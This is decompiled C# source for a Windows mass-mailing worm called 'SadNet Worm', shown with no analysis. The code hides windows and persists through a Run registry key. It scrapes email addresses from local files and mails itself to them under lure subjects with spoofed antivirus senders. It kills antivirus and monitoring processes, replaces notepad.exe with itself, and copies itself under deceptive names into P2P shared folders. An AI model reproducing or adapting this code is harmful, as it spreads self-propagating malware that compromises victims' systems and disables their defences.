using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Mail;
using System.Windows.Forms;
using Microsoft.Win32;

namespace AmirCivil;

internal class Program
{
	public class api
	{
		public const int SW_HIDE = 0;

		public const int ConsoleWindowClass = 1;

		public const string amir = "SadNet Worm";

		public const int EWX_LOGOFF = 0;

		public const int EWX_SHUTDOWN = 1;

		public const int EWX_REBOOT = 2;

		public const int EWX_FORCE = 4;

		public const int EWX_POWEROFF = 8;

		[DllImport("winmm.dll")]
		public static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

		[DllImport("user32")]
		public static extern int ShowWindow(int hwnd, int nCmdShow);

		[DllImport("user32")]
		public static extern int MessageBeep(int wType);

		[DllImport("kernel32")]
		public static extern int Sleep(int dwMilliseconds);

		[DllImport("user32")]
		public static extern int FindWindowA(string lpClassName, string lpWindowName);

		[DllImport("shell32", EntryPoint = "#59")]
		public static extern int shell32_59(int hOwner, string sExtraPrompt, int uFlags);

		[DllImport("user32")]
		public static extern int ExitWindows(int dwReserved, int uReturnCode);
	}

	private static void Main(string[] args)
	{
		//IL_0522: Unknown result type (might be due to invalid IL or missing references)
		//IL_0529: Expected O, but got Unknown
		//IL_057c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0586: Expected O, but got Unknown
		for (int i = 0; i < 26; i++)
		{
			try
			{
				api.ShowWindow(api.FindWindowA("ConsoleWindowClass", null), 0);
				api.ShowWindow(api.FindWindowA("#32770", null), 0);
				api.ShowWindow(api.FindWindowA("MGHTML_DLG_CLASS", null), 0);
				api.ShowWindow(api.FindWindowA("NAVAP Wnd Clas", null), 0);
				api.ShowWindow(api.FindWindowA("RegEdit_RegEdit", null), 0);
				api.ShowWindow(api.FindWindowA("notepad", null), 0);
			}
			catch (Exception)
			{
			}
			try
			{
				File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\Windows.cab.exe");
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SadNet", Environment.SystemDirectory + "\\Windows.cab.exe", RegistryValueKind.ExpandString);
				Registry.SetValue("HKEY_CURRENT_USER\\SadNet", "SadNet", "(_-oO]xX|-|S|-|a|-|d|-|N|-|e|-|t|-|Xx[Oo-_)!", RegistryValueKind.ExpandString);
			}
			catch (Exception)
			{
			}
			api.MessageBeep(20);
			api.shell32_59(0, "Windows", 1);
			api.Sleep(50000);
			try
			{
				string[] array = new string[20]
				{
					"mcafee", "symantec", "Yahoo!", "Pnada", "Text message", "NOD32", "F-SECURE ", "Message Notify ", "Fax Message", "Protected message",
					"love man", "Encrypted document", "Account notify", "E-mail account disabling warning", "E-mail technical support message.", "E-mail warning", "Email account utilization warning.", "Fax Message Received ", "Forum notify ", "do you know AmirCivil?"
				};
				Random random = new Random();
				int num = random.Next(0, 20);
				string subject = array[num];
				string[] array2 = new string[5] { "AmirCivil.pic.cmd", "register.pif ", "sexy-screensaver.scr ", "fullmessenger.exe", "readme.html.cmd" };
				Random random2 = new Random();
				random2.Next(0, 5);
				string[] array3 = new string[20]
				{
					"Deliver Error", "Message Error", "help attached ", "Panda anti virus", "fire wall", "is that your name? ", "picture? ", "abuse? ", "is that yours? ", "I have your password! ",
					"classroom test of you? ", "old photos about you? ", "i hope thats not true! ", "does it match? ", " you know amir_civil?!", "why should I? ", "another pic, have fun! ... :->", "xxx ? ", "the information is wrong! ", "love letter? "
				};
				Random random3 = new Random();
				int num2 = random3.Next(0, 20);
				string body = array3[num2];
				string[] array4 = new string[2] { "*txt", "*html" };
				Random random4 = new Random();
				int num3 = random4.Next(0, 2);
				string searchPattern = array4[num3];
				string[] array5 = new string[20]
				{
					"mcafee@yahoo.com", "symantec@yahoo.com", "nod32@yahoo.com", "panda@yahoo.com", "avg@yahoo.com", "antiblaster@yahoo.com", "info@yahoo.com", "ebook@yahoo.com", "LongShot@yahoo.com", "amircivil@yahoo.com",
					"update@yahoo.com", "matt@yahoo.com", "steve@yahoo.com", "smith@yahoo.com", "stan@yahoo.com", "bill@yahoo.com", "bob@yahoo.com", "YourFriend@yahoo.com", " mail@yahoo.com", "ted@yahoo.com"
				};
				Random random5 = new Random();
				int num4 = random5.Next(0, 20);
				string from = array5[num4];
				string[] array6 = new string[5] { "C:\\", "D:\\", "E:\\", "G:\\", "F:\\" };
				Random random6 = new Random();
				int num5 = random6.Next(0, 5);
				string path = array6[num5];
				for (int j = 0; j < 10; j++)
				{
					try
					{
						string[] array7 = new string[3] { "C:\\dir1", "D:\\", "C:\\windows" };
						string[] array8 = array7;
						for (int k = 0; k < array8.Length; k++)
						{
							string[] files = Directory.GetFiles(path, searchPattern);
							string[] array9 = files;
							foreach (string path2 in array9)
							{
								Regex regex = new Regex("[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[a-zA-Z0-9]+");
								FileStream fileStream = new FileStream(path2, FileMode.Open, FileAccess.Read);
								byte[] array10 = new byte[fileStream.Length];
								fileStream.Read(array10, 0, (int)fileStream.Length);
								fileStream.Close();
								foreach (Match item in regex.Matches(Encoding.ASCII.GetString(array10)))
								{
									string to = item.ToString();
									try
									{
										MailMessage val = new MailMessage();
										val.set_From(from);
										val.set_To(to);
										val.set_Cc("info@yahoo.com");
										val.set_Bcc("password@yahoo.com");
										val.set_Subject(subject);
										val.set_Body(body);
										SmtpMail.set_SmtpServer("mx4.mail.yahoo.com");
										val.get_Attachments().Add((object?)new MailAttachment(Application.get_ExecutablePath(), (MailEncoding)1));
										SmtpMail.Send(val);
									}
									catch (Exception)
									{
									}
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
			for (int m = 0; m < 500; m++)
			{
				try
				{
					string[] array11 = new string[56]
					{
						"NPROTECTED", "GhostTray", "NAVW32", "F-AGNT95", "NOD32", "NETD32", "NETMON", "IOMON98", "SCAN32", "NORMIST",
						"NAVW3", "ADAWARE", "AGENTW", "LU32", "NAVAP32", "ANTIVIR", "TCM", "W9X", "AVKSERV", "winamp",
						"ACKWIN32", "AD-AWARE", "ADVXDWIN", "AGENTSVR", "AGENTW", "ANTIVIRUS", "ANTS", "APIMONITOR", "APLICA32", "ARR",
						"AUPDATE", "AUTODOWN", "AUTOTRACE", "AVE32", "AVGCC32", "AVGCTRL", "AVGNT", "CFINET", "CLEANPC", "CTRL",
						"AV32", "DATEMANAGER ", "DOORS", "DPFSETUP ", "FCH32 ", "FNRB32", "notepad", "IEXPLORE", "POP3TRAP", "remind",
						"cftmon", "msmsgs", "taskmgr", "regedit", "vb6", "ZONEALARM"
					};
					Random random7 = new Random();
					int num6 = random7.Next(0, 56);
					string processName = array11[num6];
					Process[] processesByName = Process.GetProcessesByName(processName);
					Process[] array12 = processesByName;
					foreach (Process process in array12)
					{
						process.CloseMainWindow();
					}
				}
				catch (Exception)
				{
				}
			}
			try
			{
				string sourceFileName = Environment.SystemDirectory + "\\notepad.exe";
				string destFileName = Environment.SystemDirectory + "\\AmirCivil.exe";
				File.Move(sourceFileName, destFileName);
				File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\notepad.exe");
			}
			catch (Exception)
			{
				Console.WriteLine("Can not open explore.exe");
			}
			try
			{
				File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\\\Kazaa\\My Shared Folder\\winampa.dll.pif");
				File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\\\Kazaa\\My Shared Folder\\project.exe");
				File.Copy(Application.get_ExecutablePath(), "J:\\Program Files\\\\Kazaa\\My Shared Folder\\SkyNetAntiVirus.doc.cmd");
				File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\\\Kazaa\\My Shared Folder\\screen_saver!.scr");
				File.Copy(Application.get_ExecutablePath(), "F:\\Program Files\\\\Kazaa\\My Shared Folder\\winlogon.dll.exe");
				File.Copy(Application.get_ExecutablePath(), "H:\\Program Files\\\\Kazaa\\My Shared Folder\\fun.pic.scr");
				File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
				File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
				File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
				File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\eMule\\Incoming\\symantec.cmd");
				File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
				File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
				File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
				File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\eMule\\Incoming\\symantec.cmd");
				File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Kazaa\\My Shared Folder\\winampa2.dll.pif");
				File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\StreamCast\\Morpheus\\My Shared Folder\\winampa.dll.pif");
				File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Gnucleus\\Downloads\\AnyDVD.v6.0.0.4.Cracked-RES.by.Warez.exe");
				File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\eMule\\Incoming\\symantec.cmd");
				File.Copy(Application.get_ExecutablePath(), "C:\\Program Files\\Kazaa\\My Shared Folder\\winampa.dll.pif");
				File.Copy(Application.get_ExecutablePath(), "D:\\Program Files\\Kazaa\\My Shared Folder\\project.exe");
				File.Copy(Application.get_ExecutablePath(), "J:\\Program Files\\Kazaa\\My Shared Folder\\SkyNetAntiVirus.doc.cmd");
				File.Copy(Application.get_ExecutablePath(), "E:\\Program Files\\Kazaa\\My Shared Folder\\screen_saver!.scr");
				File.Copy(Application.get_ExecutablePath(), "F:\\Program Files\\Kazaa\\My Shared Folder\\winlogon.dll.exe");
				File.Copy(Application.get_ExecutablePath(), "H:\\Program Files\\Kazaa\\My Shared Folder\\fun.pic.scr");
			}
			catch (Exception)
			{
				Console.WriteLine("can not fine Kazaa");
			}
			try
			{
				File.Copy(Application.get_ExecutablePath(), "A:\\LOve.scr");
			}
			catch (Exception)
			{
			}
			api.shell32_59(0, "Windows", 0);
			api.Sleep(450000);
		}
		api.ExitWindows(0, 0);
	}
}
